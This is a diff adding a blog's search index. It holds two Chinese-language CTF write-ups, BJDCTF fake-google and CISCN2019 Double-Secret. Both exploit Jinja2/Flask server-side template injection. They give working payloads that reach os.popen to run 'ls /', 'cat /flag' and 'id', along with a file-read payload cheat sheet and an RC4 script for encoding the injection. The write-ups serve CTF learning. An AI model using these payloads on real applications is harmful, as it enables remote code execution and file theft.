@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>BJDCTF-2nd-fake-google</title>
+    <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
+    <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
+<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
+<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
+<ul>
+<li><em>查看根目录</em></li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
+<p>ls后台文件出现flag</p>
+<ul>
+<li><em>构造playload，查看flag</em></li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
+<h1><strong>SSTI学习🇭🇺</strong></h1>
+<p>像上面的题目的套路一般直接找playload注入</p>
+<ul>
+<li>
+<h2 id="常用playload">常用playload:</h2>
+</li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>WEB</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CISCN2019-华东南赛区-Double-Secret</title>
+    <url>/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
+    <content><![CDATA[<blockquote>
+<p>还是太菜了</p>
+</blockquote>
+<h1>0X01 <strong>打开靶机地址，使用Dirsearch进行扫描查看子目录</strong></h1>
+<ul>
+<li><em>Dirsearch扫描网站子目录命令 🍖</em></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u URL -e.php </span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>在URL后面添加扫面的子目录，只要robots.txt有些提示，提示如下</em>(<em>然并软</em>    😓     )</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">It is Android ctf</span><br></pre></td></tr></table></figure>
+<h1>0X02 <strong>使用BP进行抓包</strong></h1>
+<p>没有任何线索</p>
+<blockquote>
+<p>想起了页面的提示 Double Secret重新构建URL</p>
+</blockquote>
+<h1>0X03 <strong>重新构造URL</strong></h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1e053da9-5f6a-4ffb-a109-4bbcaf0695d8.node3.buuoj.cn/secret</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png" alt="1"></p>
+<ul>
+<li><em>根据提示，我们double一下</em></li>
+</ul>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/2.png" alt="2"></p>
+<ul>
+<li><em>我们发现在&quot;secret=&quot;后，后面添加不同数字就会产生不同的数值。（这个时候我们的思路大致是SQL，flask，<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>）💇</em></li>
+</ul>
+<h1>0X04 <strong>经过验证，无法使用php伪协议，SQL注入拿到flag，我们试一试flask（后面页面的内容也证实了我们的观点）</strong></h1>
+<h2 id="1-先随便输入几个字符串"><em>1. 先随便输入几个字符串</em></h2>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/3.png" alt="3"></p>
+<h2 id="2-代码如下-暗示得非常明显了-🐹"><em>2. 代码如下(暗示得非常明显了 🐹 )</em></h2>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">​<span class="keyword">if</span>(secret==None)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="3-进行代码审计🐺"><em>3. 进行代码审计🐺</em></h2>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">File <span class="string">&quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;</span>, line <span class="number">1799</span>, <span class="keyword">in</span> dispatch_request</span><br><span class="line"><span class="keyword">return</span> self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line">File <span class="string">&quot;/app/app.py&quot;</span>, line <span class="number">35</span>, <span class="keyword">in</span> secret</span><br><span class="line">    <span class="keyword">if</span>(secret==None): <span class="meta">#如果secret为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span> <span class="meta">#返回这句话</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#RC4解密</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+<p>对我们传入的参数开始进行判断，如果参数是空，就会返回”Tell me your secret.I will encrypt it so others can’t see“这句话，如果传入参数，就会进行RC4加密。同时泄露了密钥&quot;HereIsTreasure&quot; :happy:</p>
+<h2 id="4-构造一下RC4加密脚本"><em>4.构造一下RC4加密脚本</em></h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="5-得到加密的字符串"><em>5.得到加密的字符串</em></h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.%<span class="number">14</span>%1E%<span class="number">12</span>%C3%A484mg%C2%9C%C3%8B%<span class="number">00</span>%C2%<span class="number">81</span>%C2%8D%C2%B8%C2%<span class="number">97</span>%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%<span class="number">96</span>%3D%C2%9D%5B%C3%<span class="number">987</span>%C3%AA%<span class="number">12</span>%C2%B4%05%C2%84A%C2%BF%<span class="number">17</span>%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%<span class="number">98</span>/%<span class="number">00</span>%C2%<span class="number">90</span>%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%<span class="number">23</span>%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%<span class="number">92</span></span><br></pre></td></tr></table></figure>
+<h2 id="6-在之前构建的URL后面输入加密的字符串"><em>6.在之前构建的URL后面输入加密的字符串</em></h2>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//2afce8f4-7dee-42fa-bb7a-c9eb932c319e.node3.buuoj.cn/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/4.png" alt="4"></p>
+<h1><strong>拿到flag:happy:</strong></h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;class&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> allowed. Secret <span class="keyword">is</span> flag&#123;<span class="number">6e76</span>b7ec<span class="number">-1f</span>75<span class="number">-4686</span><span class="number">-8096</span>-bfa9f35caf9f&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/5.png" alt="5"></p>
+<h1><strong>总结考点：模板注入，RC4加密，python编写脚本</strong></h1>
+]]></content>
+      <tags>
+        <tag>WEB</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+</search>
